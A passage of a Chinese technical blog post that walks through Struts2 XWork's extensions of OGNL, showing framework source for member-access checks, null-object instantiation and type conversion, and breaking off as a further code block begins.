<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">DefaultMemberAccess</span> <span class="kd">implements</span> <span class="n">MemberAccess</span>
<span class="o">{</span>
    <span class="kd">public</span> <span class="kt">boolean</span>      <span class="n">allowPrivateAccess</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kt">boolean</span>      <span class="n">allowProtectedAccess</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kt">boolean</span>      <span class="n">allowPackageProtectedAccess</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>

  <span class="cm">/*===================================================================
</span><span class="cm">    Constructors
</span><span class="cm">    ===================================================================*/</span>
  <span class="kd">public</span> <span class="nf">DefaultMemberAccess</span><span class="o">(</span><span class="kt">boolean</span> <span class="n">allowAllAccess</span><span class="o">)</span>
  <span class="o">{</span>
      <span class="k">this</span><span class="o">(</span><span class="n">allowAllAccess</span><span class="o">,</span> <span class="n">allowAllAccess</span><span class="o">,</span> <span class="n">allowAllAccess</span><span class="o">);</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="nf">DefaultMemberAccess</span><span class="o">(</span><span class="kt">boolean</span> <span class="n">allowPrivateAccess</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">allowProtectedAccess</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">allowPackageProtectedAccess</span><span class="o">)</span>
  <span class="o">{</span>
      <span class="kd">super</span><span class="o">();</span>
      <span class="k">this</span><span class="o">.</span><span class="na">allowPrivateAccess</span> <span class="o">=</span> <span class="n">allowPrivateAccess</span><span class="o">;</span>
      <span class="k">this</span><span class="o">.</span><span class="na">allowProtectedAccess</span> <span class="o">=</span> <span class="n">allowProtectedAccess</span><span class="o">;</span>
      <span class="k">this</span><span class="o">.</span><span class="na">allowPackageProtectedAccess</span> <span class="o">=</span> <span class="n">allowPackageProtectedAccess</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="cm">/*===================================================================
</span><span class="cm">    Public methods
</span><span class="cm">    ===================================================================*/</span>
  <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">getAllowPrivateAccess</span><span class="o">()</span>
  <span class="o">{</span>
      <span class="k">return</span> <span class="n">allowPrivateAccess</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setAllowPrivateAccess</span><span class="o">(</span><span class="kt">boolean</span> <span class="n">value</span><span class="o">)</span>
  <span class="o">{</span>
      <span class="n">allowPrivateAccess</span> <span class="o">=</span> <span class="n">value</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">getAllowProtectedAccess</span><span class="o">()</span>
  <span class="o">{</span>
      <span class="k">return</span> <span class="n">allowProtectedAccess</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setAllowProtectedAccess</span><span class="o">(</span><span class="kt">boolean</span> <span class="n">value</span><span class="o">)</span>
  <span class="o">{</span>
      <span class="n">allowProtectedAccess</span> <span class="o">=</span> <span class="n">value</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">getAllowPackageProtectedAccess</span><span class="o">()</span>
  <span class="o">{</span>
      <span class="k">return</span> <span class="n">allowPackageProtectedAccess</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setAllowPackageProtectedAccess</span><span class="o">(</span><span class="kt">boolean</span> <span class="n">value</span><span class="o">)</span>
  <span class="o">{</span>
      <span class="n">allowPackageProtectedAccess</span> <span class="o">=</span> <span class="n">value</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="cm">/*===================================================================
</span><span class="cm">    MemberAccess interface
</span><span class="cm">    ===================================================================*/</span>
    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">setup</span><span class="o">(</span><span class="n">Map</span> <span class="n">context</span><span class="o">,</span> <span class="n">Object</span> <span class="n">target</span><span class="o">,</span> <span class="n">Member</span> <span class="n">member</span><span class="o">,</span> <span class="n">String</span> <span class="n">propertyName</span><span class="o">)</span>
    <span class="o">{</span>
        <span class="n">Object</span>      <span class="n">result</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">isAccessible</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">target</span><span class="o">,</span> <span class="n">member</span><span class="o">,</span> <span class="n">propertyName</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">AccessibleObject</span>    <span class="n">accessible</span> <span class="o">=</span> <span class="o">(</span><span class="n">AccessibleObject</span><span class="o">)</span><span class="n">member</span><span class="o">;</span>

            <span class="k">if</span> <span class="o">(!</span><span class="n">accessible</span><span class="o">.</span><span class="na">isAccessible</span><span class="o">())</span> <span class="o">{</span>
                <span class="n">result</span> <span class="o">=</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">TRUE</span><span class="o">;</span>
                <span class="n">accessible</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">restore</span><span class="o">(</span><span class="n">Map</span> <span class="n">context</span><span class="o">,</span> <span class="n">Object</span> <span class="n">target</span><span class="o">,</span> <span class="n">Member</span> <span class="n">member</span><span class="o">,</span> <span class="n">String</span> <span class="n">propertyName</span><span class="o">,</span> <span class="n">Object</span> <span class="n">state</span><span class="o">)</span>
    <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">state</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="o">((</span><span class="n">AccessibleObject</span><span class="o">)</span><span class="n">member</span><span class="o">).</span><span class="na">setAccessible</span><span class="o">(((</span><span class="n">Boolean</span><span class="o">)</span><span class="n">state</span><span class="o">).</span><span class="na">booleanValue</span><span class="o">());</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="cm">/**
</span><span class="cm">        Returns true if the given member is accessible or can be made accessible
</span><span class="cm">        by this object.
</span><span class="cm">     */</span>
  <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">isAccessible</span><span class="o">(</span><span class="n">Map</span> <span class="n">context</span><span class="o">,</span> <span class="n">Object</span> <span class="n">target</span><span class="o">,</span> <span class="n">Member</span> <span class="n">member</span><span class="o">,</span> <span class="n">String</span> <span class="n">propertyName</span><span class="o">)</span>
  <span class="o">{</span>
      <span class="kt">int</span>         <span class="n">modifiers</span> <span class="o">=</span> <span class="n">member</span><span class="o">.</span><span class="na">getModifiers</span><span class="o">();</span>
      <span class="kt">boolean</span>     <span class="n">result</span> <span class="o">=</span> <span class="n">Modifier</span><span class="o">.</span><span class="na">isPublic</span><span class="o">(</span><span class="n">modifiers</span><span class="o">);</span>

      <span class="k">if</span> <span class="o">(!</span><span class="n">result</span><span class="o">)</span> <span class="o">{</span>
          <span class="k">if</span> <span class="o">(</span><span class="n">Modifier</span><span class="o">.</span><span class="na">isPrivate</span><span class="o">(</span><span class="n">modifiers</span><span class="o">))</span> <span class="o">{</span>
              <span class="n">result</span> <span class="o">=</span> <span class="n">getAllowPrivateAccess</span><span class="o">();</span>
          <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
              <span class="k">if</span> <span class="o">(</span><span class="n">Modifier</span><span class="o">.</span><span class="na">isProtected</span><span class="o">(</span><span class="n">modifiers</span><span class="o">))</span> <span class="o">{</span>
                  <span class="n">result</span> <span class="o">=</span> <span class="n">getAllowProtectedAccess</span><span class="o">();</span>
              <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                  <span class="n">result</span> <span class="o">=</span> <span class="n">getAllowPackageProtectedAccess</span><span class="o">();</span>
              <span class="o">}</span>
          <span class="o">}</span>
      <span class="o">}</span>
      <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
  <span class="o">}</span>
<span class="o">}</span></code></pre></td></tr></table>
</div>
</div>
<p>在XWork中对DefaultMemberAccess做了一定扩展，具体看 SecurityMemberAccess 代码实现： 增加了静态方法的调用限制、正则匹配限制某些属性的访问</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span><span class="lnt">95
</span><span class="lnt">96
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">SecurityMemberAccess</span> <span class="kd">extends</span> <span class="n">DefaultMemberAccess</span> <span class="o">{</span>

    <span class="kd">private</span> <span class="kt">boolean</span> <span class="n">allowStaticMethodAccess</span><span class="o">;</span>
    <span class="n">Set</span><span class="o">&lt;</span><span class="n">Pattern</span><span class="o">&gt;</span> <span class="n">excludeProperties</span> <span class="o">=</span> <span class="n">Collections</span><span class="o">.</span><span class="na">emptySet</span><span class="o">();</span>
    <span class="n">Set</span><span class="o">&lt;</span><span class="n">Pattern</span><span class="o">&gt;</span> <span class="n">acceptProperties</span> <span class="o">=</span> <span class="n">Collections</span><span class="o">.</span><span class="na">emptySet</span><span class="o">();</span>

    <span class="kd">public</span> <span class="nf">SecurityMemberAccess</span><span class="o">(</span><span class="kt">boolean</span> <span class="n">method</span><span class="o">)</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
        <span class="n">allowStaticMethodAccess</span> <span class="o">=</span> <span class="n">method</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">getAllowStaticMethodAccess</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">allowStaticMethodAccess</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setAllowStaticMethodAccess</span><span class="o">(</span><span class="kt">boolean</span> <span class="n">allowStaticMethodAccess</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">allowStaticMethodAccess</span> <span class="o">=</span> <span class="n">allowStaticMethodAccess</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">isAccessible</span><span class="o">(</span><span class="n">Map</span> <span class="n">context</span><span class="o">,</span> <span class="n">Object</span> <span class="n">target</span><span class="o">,</span> <span class="n">Member</span> <span class="n">member</span><span class="o">,</span>
                                <span class="n">String</span> <span class="n">propertyName</span><span class="o">)</span> <span class="o">{</span>

        <span class="kt">boolean</span> <span class="n">allow</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
        <span class="kt">int</span> <span class="n">modifiers</span> <span class="o">=</span> <span class="n">member</span><span class="o">.</span><span class="na">getModifiers</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">Modifier</span><span class="o">.</span><span class="na">isStatic</span><span class="o">(</span><span class="n">modifiers</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">member</span> <span class="k">instanceof</span> <span class="n">Method</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">getAllowStaticMethodAccess</span><span class="o">())</span> <span class="o">{</span>
                <span class="n">allow</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">target</span> <span class="k">instanceof</span> <span class="n">Class</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">)</span> <span class="n">target</span><span class="o">;</span>
                    <span class="n">Method</span> <span class="n">method</span> <span class="o">=</span> <span class="o">(</span><span class="n">Method</span><span class="o">)</span> <span class="n">member</span><span class="o">;</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">Enum</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">method</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;values&#34;</span><span class="o">))</span>
                        <span class="n">allow</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>

        <span class="c1">//failed static test
</span><span class="c1"></span>        <span class="k">if</span> <span class="o">(!</span><span class="n">allow</span><span class="o">)</span>
            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>

        <span class="c1">// Now check for standard scope rules
</span><span class="c1"></span>        <span class="k">if</span> <span class="o">(!</span><span class="kd">super</span><span class="o">.</span><span class="na">isAccessible</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">target</span><span class="o">,</span> <span class="n">member</span><span class="o">,</span> <span class="n">propertyName</span><span class="o">))</span>
            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>

        <span class="k">return</span> <span class="n">isAcceptableProperty</span><span class="o">(</span><span class="n">propertyName</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">protected</span> <span class="kt">boolean</span> <span class="nf">isAcceptableProperty</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span> <span class="n">name</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">isAccepted</span><span class="o">(</span><span class="n">name</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isExcluded</span><span class="o">(</span><span class="n">name</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">protected</span> <span class="kt">boolean</span> <span class="nf">isAccepted</span><span class="o">(</span><span class="n">String</span> <span class="n">paramName</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(!</span><span class="k">this</span><span class="o">.</span><span class="na">acceptProperties</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">())</span> <span class="o">{</span>
            <span class="k">for</span> <span class="o">(</span><span class="n">Pattern</span> <span class="n">pattern</span> <span class="o">:</span> <span class="n">acceptProperties</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">Matcher</span> <span class="n">matcher</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="na">matcher</span><span class="o">(</span><span class="n">paramName</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">matcher</span><span class="o">.</span><span class="na">matches</span><span class="o">())</span> <span class="o">{</span>
                    <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
                <span class="o">}</span>
            <span class="o">}</span>

            <span class="c1">//no match, but acceptedParams is not empty
</span><span class="c1"></span>            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="c1">//empty acceptedParams
</span><span class="c1"></span>        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">protected</span> <span class="kt">boolean</span> <span class="nf">isExcluded</span><span class="o">(</span><span class="n">String</span> <span class="n">paramName</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(!</span><span class="k">this</span><span class="o">.</span><span class="na">excludeProperties</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">())</span> <span class="o">{</span>
            <span class="k">for</span> <span class="o">(</span><span class="n">Pattern</span> <span class="n">pattern</span> <span class="o">:</span> <span class="n">excludeProperties</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">Matcher</span> <span class="n">matcher</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="na">matcher</span><span class="o">(</span><span class="n">paramName</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">matcher</span><span class="o">.</span><span class="na">matches</span><span class="o">())</span> <span class="o">{</span>
                    <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setExcludeProperties</span><span class="o">(</span><span class="n">Set</span><span class="o">&lt;</span><span class="n">Pattern</span><span class="o">&gt;</span> <span class="n">excludeProperties</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">excludeProperties</span> <span class="o">=</span> <span class="n">excludeProperties</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setAcceptProperties</span><span class="o">(</span><span class="n">Set</span><span class="o">&lt;</span><span class="n">Pattern</span><span class="o">&gt;</span> <span class="n">acceptedProperties</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">acceptProperties</span> <span class="o">=</span> <span class="n">acceptedProperties</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span></code></pre></td></tr></table>
</div>
</div>
<p>看一下XWork都实现了Ognl的那些类：</p>

<p><img src="/images/struts2/ognl-context.jpeg" alt="struts2" /></p>

<h3 id="0x007-ognl在计算时是如何处理类型转化的-又是如何处理级联对象的初始化行为的">0x007 OGNL在计算时是如何处理类型转化的 ？又是如何处理级联对象的初始化行为的 ？</h3>

<ol>
<li>使用TypeConverter进行类型转换.</li>
<li>使用InstantiatingNullHandler进行处理级联对象初始化造作，具体代码如下：</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java">   <span class="kd">public</span> <span class="n">Object</span> <span class="nf">nullPropertyValue</span><span class="o">(</span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">context</span><span class="o">,</span> <span class="n">Object</span> <span class="n">target</span><span class="o">,</span> <span class="n">Object</span> <span class="n">property</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
            <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;Entering nullPropertyValue [target=&#34;</span><span class="o">+</span><span class="n">target</span><span class="o">+</span><span class="s">&#34;, property=&#34;</span><span class="o">+</span><span class="n">property</span><span class="o">+</span><span class="s">&#34;]&#34;</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="kt">boolean</span> <span class="n">c</span> <span class="o">=</span> <span class="n">ReflectionContextState</span><span class="o">.</span><span class="na">isCreatingNullObjects</span><span class="o">(</span><span class="n">context</span><span class="o">);</span>

        <span class="k">if</span> <span class="o">(!</span><span class="n">c</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="k">if</span> <span class="o">((</span><span class="n">target</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">||</span> <span class="o">(</span><span class="n">property</span> <span class="o">==</span> <span class="kc">null</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="k">try</span> <span class="o">{</span>
            <span class="n">String</span> <span class="n">propName</span> <span class="o">=</span> <span class="n">property</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
            <span class="n">Object</span> <span class="n">realTarget</span> <span class="o">=</span> <span class="n">reflectionProvider</span><span class="o">.</span><span class="na">getRealTarget</span><span class="o">(</span><span class="n">propName</span><span class="o">,</span> <span class="n">context</span><span class="o">,</span> <span class="n">target</span><span class="o">);</span>
            <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

            <span class="k">if</span> <span class="o">(</span><span class="n">realTarget</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">PropertyDescriptor</span> <span class="n">pd</span> <span class="o">=</span> <span class="n">reflectionProvider</span><span class="o">.</span><span class="na">getPropertyDescriptor</span><span class="o">(</span><span class="n">realTarget</span><span class="o">.</span><span class="na">getClass</span><span class="o">(),</span> <span class="n">propName</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">pd</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
                <span class="o">}</span>

                <span class="n">clazz</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="na">getPropertyType</span><span class="o">();</span>
            <span class="o">}</span>

            <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="c1">// can&#39;t do much here!
</span><span class="c1"></span>                <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
            <span class="o">}</span>

            <span class="c1">// 初始化对象
</span><span class="c1"></span>            <span class="n">Object</span> <span class="n">param</span> <span class="o">=</span> <span class="n">createObject</span><span class="o">(</span><span class="n">clazz</span><span class="o">,</span> <span class="n">realTarget</span><span class="o">,</span> <span class="n">propName</span><span class="o">,</span> <span class="n">context</span><span class="o">);</span>

            <span class="n">reflectionProvider</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="n">propName</span><span class="o">,</span> <span class="n">context</span><span class="o">,</span> <span class="n">realTarget</span><span class="o">,</span> <span class="n">param</span><span class="o">);</span>

            <span class="k">return</span> <span class="n">param</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">LOG</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;Could not create and/or set value back on to object&#34;</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">private</span> <span class="n">Object</span> <span class="nf">createObject</span><span class="o">(</span><span class="n">Class</span> <span class="n">clazz</span><span class="o">,</span> <span class="n">Object</span> <span class="n">target</span><span class="o">,</span> <span class="n">String</span> <span class="n">property</span><span class="o">,</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">context</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">Collection</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">return</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="n">EnumMap</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">Class</span> <span class="n">keyClass</span> <span class="o">=</span> <span class="n">objectTypeDeterminer</span><span class="o">.</span><span class="na">getKeyClass</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getClass</span><span class="o">(),</span> <span class="n">property</span><span class="o">);</span>
            <span class="k">return</span> <span class="k">new</span> <span class="n">EnumMap</span><span class="o">(</span><span class="n">keyClass</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="n">objectFactory</span><span class="o">.</span><span class="na">buildBean</span><span class="o">(</span><span class="n">clazz</span><span class="o">,</span> <span class="n">context</span><span class="o">);</span>
    <span class="o">}</span></code></pre></td></tr></table>
</div>
</div>
<h3 id="0x008-xwork都扩展了ognl那些类">0x008  XWork都扩展了OGNL那些类？</h3>

<ol>
<li>ClassResolver ： CompoundRootAccessor</li>
<li>TypeConverter : DefaultTypeConverter、XWorkBaseConverter、XWorkConverter</li>
<li>MemberAccessor: XWorkMethodAccessor、</li>
<li>PropertyAccessor： XWorkObjectPropertyAccessor、XWorkMapPropertyAccessor、XWorkListPropertyAccessor、XWorkIteratorPropertyAccessor、ObjectProxyPropertyAccessor</li>
</ol>

<h3 id="0x09-如何在xwork中扩展ognl计算中的类型转化">0x09 如何在XWork中扩展OGNL计算中的类型转化 ？</h3>

<ol>
<li>在xwork-conversion.propertie 文件中声明</li>
<li>在java类所处于的package目录的[ClassName]-conversion.properties文件中声明</li>
<li>为java类指定特殊的Annotation</li>
</ol>

<p>附上XWorkConverter实现代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
